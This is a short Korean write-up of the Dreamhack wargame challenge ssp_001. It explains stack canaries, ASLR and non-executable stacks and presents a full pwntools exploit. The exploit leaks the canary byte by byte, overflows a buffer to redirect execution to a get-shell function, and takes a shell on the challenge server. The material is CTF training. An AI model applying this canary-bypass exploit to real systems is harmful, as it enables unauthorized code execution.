<aside>
💡 SSP란?

</aside>

SSP (Stack Smashing Protection)는 시스템 해킹, 특히 스택 오버플로우 공격에 대한 방어 기법

1. **Canary 값**: 스택에 함수의 리턴 주소 앞에 작은 데이터(캐내리)를 삽입합니다. 이 값은 함수가 리턴되기 전에 검사되며, 만약 캐내리 값이 변경되었다면 스택 오버플로우가 발생했다고 간주하고 프로그램을 종료시킵니다.
2. **주소 공간 레이아웃 무작위화 (ASLR)**: 메모리에 프로그램을 로드할 때 매번 다른 메모리 주소에 로드하는 기법으로, 공격자가 예측 가능한 주소를 악용하는 것을 어렵게 만듭니다.
3. **Non-executable 스택**: 스택 메모리 영역에 실행 권한을 부여하지 않음으로써, 스택에 삽입된 코드의 실행을 막습니다.

SSP는 주로 컴파일러 수준에서 구현되며, GCC 컴파일러에서는 **`-fstack-protector`** 옵션을 통해 활성화

//

문제 파일에 보면 get shell 함수가 있고 앞서 해왔듯 버퍼오버플로우 취약점이 보인다. 

디버깅을 통해 canary 값을 알아내고 pwntool로 exploit해주면 된다.

```python
from pwn import *
from pwn import p32
from pwn import p8

p=remote("host3.dreamhack.games",10979)

canary=b"\x00"

for i in range(129,132): 
	p.recvuntil("> ")
	p.sendline("P")
	p.sendline(str(i))
	canary+=p8(int(p.recvline().split()[-1],16)) 

payload=b'\x90'*0x40+canary+b'\x90'*0x04+b'\x90'*0x04+p32(0x80486b9)

p.recvuntil("> ")
p.sendline("E")
p.sendlineafter("Name Size : ",str(144))
p.sendlineafter("Name : ",payload)

p.interactive()
```

![ssp_001.jpg](https://github.com/JoWoonJi/Dreamhack_Wargame/blob/main/SystemHacking/img/ssp_001.jpg)

DH값 획득.
